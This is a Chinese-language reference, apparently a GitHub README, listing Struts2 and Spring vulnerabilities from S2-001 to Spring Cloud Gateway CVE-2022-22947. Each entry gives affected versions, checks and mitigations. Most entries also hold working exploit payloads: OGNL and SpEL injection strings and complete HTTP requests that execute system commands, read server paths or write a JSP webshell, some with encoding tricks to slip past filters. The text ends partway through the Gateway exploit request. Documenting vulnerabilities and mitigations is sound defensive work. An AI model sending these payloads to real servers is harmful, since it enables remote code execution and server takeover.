# Java框架及组件漏洞
Java框架及组件漏洞POC , 以及部分经验证的官方推荐的缓解措施，便于不升级组件情况下阻止漏洞。
缓解措施仅用于缓解漏洞影响，可能对系统存在未知影响；建议先评估再使用，并在配置后跑全流程回归，避免因更改配置对系统造成影响。

# Struts2
# **S2-001**

- #### 影响版本

  ###### Struts 2.0.0 - Struts 2.0.8

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  检查lib目录或pom中的struts2组件版本是否在漏洞版本中，排查使用OGNL表达式的代码段



- #### 漏洞利用

  ##### 获取 Tomcat 执行路径：

  ```java
  %{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
  ```

  ##### 获取Web路径：

  ```java
  %{ #req=@org.apache.struts2.ServletActionContext@getRequest(), #response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(), #response.println(#req.getRealPath('/')), #response.flush(), #response.close() }
  ```

  

  ##### 命令执行：

  ```java
  %{ #a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(), #b=#a.getInputStream(), #c=new java.io.InputStreamReader(#b), #d=new java.io.BufferedReader(#c), #e=new char[50000], #d.read(#e), #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"), #f.getWriter().println(new java.lang.String(#e)), #f.getWriter().flush(),#f.getWriter().close() }
  ```
  

- #### 缓解措施



struts.xml或struts.properties中关闭altSyntax，不强制解析OGNL表达式
![image-20220421142737840](https://user-images.githubusercontent.com/33454436/165062610-fcf71a21-6ae6-4cf7-8d95-a6c74899ed2d.png)

------

# S2-005

- #### 影响版本

  ###### Struts 2.0.0 - Struts 2.1.8.1

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  检查lib目录或pom中的struts2组件版本是否在漏洞版本中，排查使用OGNL表达式的代码段

- #### 漏洞利用

  **命令执行：**

  ```java
  ('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'whoami\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))
  ```

  

- #### 缓解措施

- https://cwiki.apache.org/confluence/display/WW/S2-005

  ```xml
  <interceptor-ref name="params">
                  <param name="excludeParams">dojo\..*,^struts\..*,.*\\.*,.*\(.*,.*\).*,.*@.*</param>
  </interceptor-ref>
  ```

  strut.xml中增加拦截器

![image-20220421145415172](https://user-images.githubusercontent.com/33454436/165062710-e387aa03-aa8d-4d83-b0e4-ab3fc1eba934.png)

------

# S2-009

- #### 影响版本

  ###### Struts 2.0.0 - Struts 2.3.1.1

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  检查lib目录或pom中的struts2组件版本是否在漏洞版本中，排查使用OGNL表达式的代码段

- #### 漏洞利用

  ###### 命令执行：验证环境2.0.11.2；2.0.6未成功

```java
(#context["xwork.MethodAccessor.denyMethodExecution"]= new java.lang.Boolean(false), #_memberAccess["allowStaticMethodAccess"]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec('calc.exe'))(meh)&z[(这个是参数名，如id)('meh')]=true
```

- #### 缓解措施

```java
2.0.11.2环境实验，005的正则可以规避漏洞，官方给出的009正则不能正确过滤；考虑应该是版本问题

005正则
<interceptor-ref name="params">
 <param name="excludeParams">dojo\..*,^struts\..*,.*\\.*,.*\(.*,.*\).*,.*@.*</param>
</interceptor-ref>


009正则
<interceptor-ref name="params">
<param name="acceptParamNames">\w+((\.\w+)|(\[\d+\])|(\['\w+'\]))*</param>
</interceptor-ref>
```

------



# S2-013

- #### 影响版本

  ###### Struts 2.0.0 - Struts 2.3.14.1

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  ###### 检查lib目录或pom中的struts2组件版本是否在漏洞版本中，重点关注是否存在如下标签设置：

  ```java
  <s:a id="id" action="DemoT" includeParams="all">"s:a" tag</s:a>
  <s:url id="id" action="DemoX" includeParams="get">"s:url" tag</s:url>
  
  使用s:url/s:a标签，且配置了includeParams属性为all/get
  ```

  

- #### 漏洞利用

  ###### 命令执行

  ```java
  ${#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('calc').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(+new java.lang.String(#d)),#out.close()}
  ```

  

- #### 缓解措施

  ###### 升级组件至安全版本，不将includeParams配置为all或get

------

# S2-016

- #### 影响版本

  ###### Struts 2.0.0 - Struts 2.3.15

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  ###### 检查lib目录或pom中的struts2组件版本是否在漏洞版本中

- #### 漏洞利用

  可能存在其他变体poc

  ###### 命令执行

  ```java
  redirect:${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("uname -a").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()}
  ```

  ###### 目录读取

  ```java
  redirect:${#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),#resp.setCharacterEncoding('UTF-8'),#ot=#resp.getWriter (),#ot.print('web'),#ot.print('path:'),#ot.print(#req.getSession().getServletContext().getRealPath('/')),#ot.flush(),#ot.close()}
  ```

  ###### webshell

  ```java
  redirect:${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletRequest"),#b=new java.io.FileOutputStream(new java.lang.StringBuilder(#a.getRealPath("/")).append(@java.io.File@separator).append("1.jspx").toString()),#b.write(#a.getParameter("t").getBytes()),#b.close(),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println("BINGO"),#genxor.flush(),#genxor.close()}
  ```

  ###### S2-017重定向漏洞

  ```java
  http://host/struts2-showcase/modelDriven/modelDriven.action?redirectAction:http://www.google.com/%23
  http://host/struts2-showcase/fileupload/upload.action?redirect:http://www.yahoo.com/
  ```

  

- #### 缓解措施

  官方暂无缓解措施，只能通过升级规避漏洞，且与S2-017相同，通过redirect:/redirectAction:实现重定向漏洞。**新版本DefaultActionMapper 已更改为完全删除与“redirect:”/“redirectAction:”-前缀参数有关的功能**。

------

# S2-devMode

- #### 影响版本

  ###### 2.1.0及以上，高版本需要手工绕沙盒

- #### 安全版本

  ######  不要开启devMode

- #### 排查方法

  ###### 排查struts.xml或struts.properties文件，查看devMode属性是否为true

- #### 漏洞利用

  ###### 探测：

  ```
  debug=xml
  ```

  ###### 命令执行：

  ```java
  debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=webpath888888&command=whoami
  ```

- #### 缓解措施

  ###### 不开启devMode

 ![image-20220424005310379](https://user-images.githubusercontent.com/33454436/165062850-801e0e3d-d9fe-4670-91c6-2a55448fbbe7.png)


------

# S2-019

- #### 影响版本

  ######  Struts 2.0.0 - Struts 2.3.15.1

- #### 安全版本

  ###### 2.5.30（2.3.15.2之后默认不开启DynamicMethodInvocation，但涉及其他漏洞）

- #### 排查方法

  ###### 检查lib目录或pom中的struts2组件版本是否在漏洞版本中，或高版本的组件是否配置struts.enable.DynamicMethodInvocation为true

- #### 漏洞利用

  ###### 命令执行：

  ```java
  debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29%2C%23b%3D%23a.getInputStream%28%29%2C%23dis%3Dnew+java.io.DataInputStream%28%23b%29%2C%23buf%3Dnew+byte%5B20000%5D%2C%23dis.read%28%23buf%29%2C%23dis.close%28%29%2C%23msg%3Dnew+java.lang.String%28%23buf%29%2C%23msg%3D%23msg.trim%28%29
  ```

  

- #### 缓解措施

  ###### 在struts.xml或struts.properties中进行如下配置：

![image-20220424115319188](https://user-images.githubusercontent.com/33454436/165062885-383aa560-6165-4607-8558-097f6a3704db.png)

------

# S2-032

- #### 影响版本

  ###### Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3 和 2.3.24.3 除外）

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  ###### 检查lib目录或pom中的struts2组件版本是否在漏洞版本中且是否配置struts.enable.DynamicMethodInvocation为true

- #### 漏洞利用

  ###### 命令执行：

  ```java
  method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString=&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=calc
  ```

- #### 缓解措施

  ###### 在struts.xml或struts.properties中进行如下配置：与S2-019可用相同配置

![image-20220424115319188](https://user-images.githubusercontent.com/33454436/165063660-72615a31-a6d3-4c36-91be-cc0df4d6bd65.png)


------

# S2-037

- #### 影响版本

  ###### Struts 2.3.20 - Struts Struts 2.3.28.1

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  ###### 检查lib目录或pom中的struts2组件版本是否在漏洞版本中且是否使用rest插件

- #### 漏洞利用

  ###### 命令执行：

  ```java
  %28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=7556&command=ls
  ```

- #### 缓解措施

  无，建议升级至安全版本。

  ------

# S2-045

- #### 影响版本

  ###### Struts 2.3.5 - Struts 2.3.31，Struts 2.5 - Struts 2.5.10

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  ###### 检查lib目录或pom中的struts2组件版本是否在漏洞版本中

- #### 漏洞利用

  ###### 命令执行：

  ```java
  一、
  Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='calc').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
  ```

  ```
  二、bypass
  smultipart/form-data%{(#dm=@\u006fgnl.OgnlC\u006fntext@DEF\u0041ULT_MEMBER_\u0041CCESS).(#_member\u0041ccess?(#_member\u0041ccess=#dm):((#c\u006fntainer=#c\u006fntext['c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.\u0041cti\u006fnC\u006fntext.c\u006fntainer']).(#\u006fgnlUtil=#c\u006fntainer.getInstance(@c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.\u006fgnl.OgnlUtil@class)).(#\u006fgnlUtil.getExcludedPackageNames().clear()).(#\u006fgnlUtil.getExcludedClasses().clear()).(#c\u006fntext.setMember\u0041ccess(#dm)))).(#req=#c\u006fntext.get('c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.dispatcher.HttpServletRequest')).(#hh=#c\u006fntext.get('c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.dispatcher.HttpServletResp\u006fnse')).(#\u006fsname=@java.lang.System@getPr\u006fperty('\u006fs.name')).(#list=#\u006fsname.startsWith('Wind\u006fws')?{'cmd.exe','/c','whoami'}:{'/bin/bash','-c','whoami'}).(#aa=(new java.lang.Pr\u006fcessBuilder(#list)).start()).(#bb=#aa.getInputStream()).(#hh.getWriter().println(new java.lang.String(new \u006frg.apache.c\u006fmm\u006fns.i\u006f.IOUtils().t\u006fByte\u0041rray(#bb),'GB2312'))?true:true).(#hh.getWriter().flush()).(#hh.getWriter().cl\u006fse())}
  ```

  

- #### 缓解措施

  换个解析器，但这个2.3.18版本及之后才有；不能升级就加过滤器，详见：https://cwiki.apache.org/confluence/display/WW/S2-045

  ![image-20220424154943122](https://user-images.githubusercontent.com/33454436/165063813-f9c348f5-8311-48eb-bb64-12e35a49c6dc.png)


  ![image-20220424155452180](https://user-images.githubusercontent.com/33454436/165063823-fc439e60-6e05-495e-ae53-7ae2b8b7ca10.png)

------

# S2-046

- #### 影响版本

  ###### Struts 2.3.5 - Struts 2.3.31，Struts 2.5 - Struts 2.5.10

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  检查lib目录或pom中的struts2组件版本是否在漏洞版本中

- #### 漏洞利用

  ###### 命令执行：

  ```java
  %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.b   
  
  b前面的 . 要截断 hex改00
  ```

- #### 缓解措施

  使用官方新增的两个解析器

  ```xml
  <bean type="org.apache.struts2.dispatcher.multipart.MultiPartRequest"
             class="org.apache.struts.extras.SecureJakartaStreamMultiPartRequest"
             name="secure-jakarta-stream"
             scope="default"/>
     
  <!-- when running Struts 2.3.8 use this constant name -->
  <constant name="struts.multipart.handler" value="secure-jakarta-stream"/>
  <!-- when running Struts 2.3.9 - 2.3.31 use this constant name -->
  <constant name="struts.multipart.parser" value="secure-jakarta-stream"/>
  ```

  是maven构建的加以下标签

  ```xml
  <dependency>
      <groupId>org.apache.struts</groupId>
      <artifactId>struts2-secure-jakarta-stream-multipart-parser-plugin</artifactId>
      <version>1.1</version>            
  </dependency>
  ```

  直接用jar包的

  http://search.maven.org/remotecontent?filepath=org/apache/struts/struts2-secure-jakarta-stream-multipart-parser-plugin/1.1/struts2-secure-jakarta-stream-multipart-parser-plugin-1.1.jar

  详见：

  https://github.com/apache/struts-extras

  https://cwiki.apache.org/confluence/display/WW/S2-046

------

# S2-048

- #### 影响版本

  ###### 使用struts1插件的struts2.3.X版本，struts 1

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  ###### 1、检查lib目录或pom中是否存在struts2-struts1-plugin-2.x.x.jar,

  ###### 2、检查项目中使用部署showcase

- #### 漏洞利用

  ###### 命令执行：

  ```
  %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())).(#q)}
  ```

- #### 缓解措施

  ###### 1、不使用struts2-struts1-plugin-2.x.x.jar或升级struts版本

  ###### 2、不部署showcase,如需部署要修改SaveGangsterAction.java，示例如下：

![image-20220424220859218](https://user-images.githubusercontent.com/33454436/165063082-9701de91-e21d-4db2-9d12-6bc9be9ca443.png)


------

# S2-053

- #### 影响版本

  ###### Struts 2.0.0 - 2.3.33Struts 2.5 - Struts 2.5.10.1

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  1、检查lib目录或pom中的struts2组件版本是否在漏洞版本中；

  2、检查是否使用freemarker模板，如使用可查看ftl中是否存在如下结构表达式：

  ```java
  <@s.hidden name="redirectUri" value=redirectUri />
  <@s.hidden name="redirectUri" value="${redirectUri}" />
  <@s.hidden name="${redirectUri}"/>
  ```

- #### 漏洞利用

  ###### 命令执行：

  ```
  %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
  ```

  

- #### 缓解措施

  如果使用以下模板表达式：
![image-20220424235636379](https://user-images.githubusercontent.com/33454436/165063142-c1348cc4-61ff-4854-b475-fbb058e7a122.png)
  

  当Action中有getter、setter方法时，则触发漏洞，如下：

  ![image-20220424235758384](https://user-images.githubusercontent.com/33454436/165063175-cb329c25-ddd7-4775-991f-b71f4c080d82.png)


  当Action中只有getter时，不触发该漏洞，如下：

![image-20220424235834946](https://user-images.githubusercontent.com/33454436/165063189-057041ca-b58d-4aeb-b865-5c251d6b4825.png)


官方未提供缓解措施。不要使用存在漏洞的表达式结果，或升级至安全版本解决漏洞。

------

# S2-057

- #### 影响版本

  ###### Struts 2.0.4 - Struts 2.3.34、Struts 2.5.0 - Struts 2.5.16

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  ###### 1、检查lib目录或pom中的struts2组件版本是否在漏洞版本中；

  ###### 2、检查struts.xml中的package标签以及result标签中的param标签是否没有配置namespace或使用通配符进行配置

- #### 漏洞利用

  ###### 命令执行：

  ```java
  ${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('whoami')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
  ```

  

- #### 缓解措施

  固定package标签页以及result的param标签页的namespace值，以及禁止使用通配符。

  ![image-20220425102855944](https://user-images.githubusercontent.com/33454436/165063240-687b8a25-6439-4016-8d3a-7aa8f332917e.png)


------

# S2-061

- #### 影响版本

  ######  Struts 2.0.0 - Struts 2.5.25

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  ###### 1、检查lib目录或pom中的struts2组件版本是否在漏洞版本中

  ###### 2、检查JSP中是否存在将用户输入数据未经过滤直接使用表达式解析

- #### 漏洞利用

  ###### 命令执行：

  ```java
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
  Content-Length: 829
  
  ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
  Content-Disposition: form-data; name="id"
  
  %{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
  ------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
  ```

  

- #### 缓解措施

  通过struts.ognl.expressionMaxLength限制表达式长度，这个要结合实际功能使用，避免因配置导致正常功能无法使用。

  ![image-20220425130022300](https://user-images.githubusercontent.com/33454436/165063270-89851856-70ad-48c2-ba39-b862aad31bee.png)


  当收到OGNL注入时候，会因表达式长度受限而抛出异常

  ![image-20220425130128103](https://user-images.githubusercontent.com/33454436/165063280-56b92cf2-dabb-47e3-8880-5ded0b2841e3.png)


------

# S2-062

- #### 影响版本

  ###### Struts 2.0.0 - Struts 2.5.29

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  ###### 1、检查lib目录或pom中的struts2组件版本是否在漏洞版本中

  ###### 2、检查JSP中是否存在将用户输入数据未经过滤直接使用表达式解析

- #### 漏洞利用

  ###### 命令执行：

  ```
  与061一样，也是multipart提交
  
  %{
  (#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'calc'}))}
  ```
- #### 缓解措施

  见s2-061

======================================================================================================================================================
# SpringFramework-Vul
# Spring4Shell - CVE-2022-22965

- #### 影响版本

  ###### Springframework 5.3.0到5.3.17、5.2.0 到 5.2.19、以及更早的不受支持的版本

  ###### Springboot低版本由于间接引入受影响的SpringFramework，且也受到漏洞影响。

- #### 安全版本

  ###### 5.3.18+

  ###### 5.2.20+

- #### 排查方法

  ###### 1、检查lib目录或pom中的框架版本是否在漏洞版本中

  ###### 2、是否使用JDK9及以上版本

  ###### 3、使用tomcat作为Servlet容器，且打war包部署（Springboot用内置tomcat打jar不受影响）

- #### 漏洞利用

  ###### 命令执行（生产环境测试慎用）：

  ```html
  数据包如下（复制时候注意删除\r\n，试验环境写入webapps/ROOT不能执行jsp,因此换到webapps下其他目录）：
  
  POST /CVE-2022-22965/get HTTP/1.1
  Host: 192.168.1.5:8080
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
  Accept-Encoding: gzip, deflate
  Accept-Language: zh-CN,zh;q=0.9
  Connection: close
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 697
  suffix: %>//
  c: Runtime
  prefix: <%
  
  class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/123&class.module.classLoader.resources.context.parent.pipeline.first.prefix=12345&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
  ```

  ###### 漏洞探测：

  ```
  class.module.classLoader.resources.context.configFile=http://dnslog地址&class.module.classLoader.resources.context.configFile.content.aaa=xxx
  ```

  

- #### 缓解措施

  ###### 不升级组件的缓解措施：

  ###### 除了WAF以及其他安全监控设备上更新该漏洞相关规则以外，还可以在controller层通过指定WebDataBinder参数绑定的黑名单，再次对恶意语句的关键字进行过滤，阻止程序将其绑定到POJO上。

  ```java
    @InitBinder
      public void initBinder(WebDataBinder binder) {
          String[] blackList = {"class.*", "Class.*", "*.class.*", ".*Class.*"};
          binder.setDisallowedFields(blackList);
      }
  ```
  ![image-20220427112322300](https://user-images.githubusercontent.com/33454436/166195202-02525e45-7a27-4985-9d2b-90537ae3a6ab.png)

  
  ###### 或者通过创建一个ControllerAdvice组件，对危险参数进行拦截

  ```java
  @ControllerAdvice
  @Order(10000)
  public class BinderControllerAdvice {
      @InitBinder
      public void setAllowedFields(WebDataBinder dataBinder) {
           String[] denylist = new String[]{"class.*", "Class.*", "*.class.*", "*.Class.*"};
           dataBinder.setDisallowedFields(denylist);
      }
  
  }
  ```
  ![image-20220427125706823](https://user-images.githubusercontent.com/33454436/166195219-c4b73b43-2bd2-4ef1-bcbb-d915cf1ec293.png)

  

  

------

# Spring Cloud Function Spel表达式注入 CVE-2022-22963

- #### 影响版本：

  ###### Spring Cloud Function 3.1.6、3.2.2

- #### 安全版本：

  ###### 3.1.7

  ###### 3.2.3

- #### 排查方法：

  ###### 检查lib目录或pom中的Function组件版本是否在漏洞版本中，且应用中使用Function

- #### 漏洞利用：

  ###### 网上有些帖子说需要利用的前置条件是配置spring.cloud.function.definition=functionRouter。我用默认配置也同样能执行命令，这块有懂的可以说下。

  ###### 命令执行：

  ```
  POST /functionRouter HTTP/1.1
  Host: localhost:8080
  Accept-Encoding: gzip, deflate
  Accept: */*
  Accept-Language: en
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
  Connection: close
  spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("calc")
  Content-Type: text/plain
  Content-Length: 4
  
  test
  ```

  ![image-20220428105937657](https://user-images.githubusercontent.com/33454436/166195416-ca7427bb-64e2-44e8-99f8-583637875fb6.png)

- #### 缓解措施：

  ###### 无。

------

# Spring Cloud Gateway-CVE-2022-22947 远程代码执行

- #### 影响版本

  ###### Spring Cloud Gateway 3.1.0、3.0.0 to 3.0.6、以及更早的不受支持的版本

- #### 安全版本

  ###### Spring Cloud Gateway升级到3.11及以上或3.0.7及以上

- #### 排查方法

  ###### 检查lib目录或pom中的Gateway组件版本是否在漏洞版本中

- #### 漏洞利用

  ###### 命令执行：

  ```
  一、添加路由
  POST /actuator/gateway/routes/qqq HTTP/1.1
  Host: localhost:8080
  Accept-Encoding: gzip, deflate
  Accept: */*
  Accept-Language: en
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
  Connection: close
  Content-Type: application/json
  Content-Length: 329
  
  {
    "id": "hacktest",
    "filters": [{
      "name": "AddResponseHeader",
      "args": {
        "name": "Result",
        "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"
      }
    }],
    "uri": "http://example.com"
  }
  
  二、刷新路由
  POST /actuator/gateway/refresh HTTP/1.1
  Host: localhost:8080
  Accept-Encoding: gzip, deflate
  Accept: */*
  Accept-Language: en
